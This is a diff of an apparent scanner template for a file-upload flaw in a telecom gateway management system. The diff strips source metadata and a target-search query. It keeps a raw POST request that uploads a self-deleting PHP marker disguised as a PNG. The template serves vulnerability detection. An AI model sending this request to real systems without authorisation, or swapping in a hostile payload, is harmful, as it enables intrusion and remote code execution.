@@ -3,12 +3,8 @@ info:
   name: 电信网关配置管理系统 文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pmogztonaiwxio4h'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pmogztonaiwxio4h
-    fofa: body="img/dl.gif" && title="系统登录"
 http:
 - raw:
   - 'POST /manager/teletext/material/upload.php HTTP/1.1
@@ -38,8 +34,6 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB33cDIYAxIrc9MsS
 
 
-
-
     ------WebKitFormBoundaryB33cDIYAxIrc9MsS
 
 
@@ -47,8 +41,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <?php echo "DudeSuite";unlink(__FILE__); ?>
@@ -60,8 +52,6 @@ http:
     Content-Disposition: form-data; name="type"
 
 
-
-
     img
 
 
@@ -69,8 +59,6 @@ http:
 
 
     Content-Disposition: form-data; name="w"
-
-
 
 
     1280
@@ -82,8 +70,6 @@ http:
     Content-Disposition: form-data; name="h"
 
 
-
-
     720
 
 
@@ -91,8 +77,6 @@ http:
 
 
     Content-Disposition: form-data; name="userid"
-
-
 
 
     1000398
@@ -104,8 +88,6 @@ http:
     Content-Disposition: form-data; name="appid"
 
 
-
-
     5
 
 
@@ -113,8 +95,6 @@ http:
 
 
     Content-Disposition: form-data; name="uploadtime"
-
-
 
 
     20230603_231117_1685805077294
